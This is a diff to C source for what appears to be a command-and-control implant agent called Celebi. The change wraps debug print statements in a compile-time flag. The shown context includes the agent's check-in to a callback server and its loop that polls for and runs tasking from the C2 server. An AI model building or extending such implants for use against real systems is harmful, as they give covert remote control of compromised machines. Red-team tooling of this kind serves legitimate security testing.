@@ -98,12 +98,17 @@ void perform_tasking(AgentParams *params, HttpHandle *http, TaskingReply *reply)
 
 void process_task(TaskInfo *task, AgentState *state, AgentCapabilities *cap) {
 	if (MSVCRT$strcmp(task->command, "exit") == 0) {
+		#ifdef CELEBI_DEBUG
 		dprintf("Received exit command.");
+		#endif
+		
 		agent_exit(state, cap);
 		return;
 	}
 	
+	#ifdef CELEBI_DEBUG
 	dprintf("UNKNOWN COMMAND %s: %s %s", task->id, task->command, task->parameters);
+	#endif
 }
 
 void go() {
@@ -111,19 +116,31 @@ void go() {
 	AgentCapabilities capabilities = { 0 };
 	
 	unpack_params(RAW_PARAMS, &state.params);
+	
+	#ifdef CELEBI_DEBUG
 	dprintf("Parameters unpacked.");
+	#endif
 	
 	load_picos(&capabilities);
+	
+	#ifdef CELEBI_DEBUG
 	dprintf("Loaded PICO capabilities.");
+	#endif
 	
 	state.http = HttpInit(state.params.callback_https);
 	
+	#ifdef CELEBI_DEBUG
 	dprintf("Checking in...");
+	#endif
+	
 	CheckinReply checkin_reply = { 0 };
 	perform_checkin(&state.params, &capabilities, state.http, &checkin_reply);
 	
 	if ((checkin_reply.status == NULL) || (MSVCRT$strcmp(checkin_reply.status, "success") != 0)) {
+		#ifdef CELEBI_DEBUG
 		dprintf("Checkin failed with: %s", checkin_reply.status);
+		#endif
+		
 		free_checkin_reply(&checkin_reply);
 		agent_exit(&state, &capabilities);
 		return;
@@ -131,14 +148,20 @@ void go() {
 	
 	state.params.callback_uuid = clone_str(checkin_reply.callback_uuid);
 	free_checkin_reply(&checkin_reply);
+	
+	#ifdef CELEBI_DEBUG
 	dprintf("Successful checkin with payload UUID %s and callback UUID %s", state.params.payload_uuid, state.params.callback_uuid);
+	#endif
 	
 	while (1) {
 		// Look ma, no masking!
 		TaskingReply tasking_reply = { 0 };
 		perform_tasking(&state.params, state.http, &tasking_reply);
 		
+		#ifdef CELEBI_DEBUG
 		dprintf("Received tasking from C2 server!");
+		#endif
+		
 		for (int i = 0; i < tasking_reply.tasking_size; i++) {
 			process_task(&tasking_reply.tasks[i], &state, &capabilities);
 		}
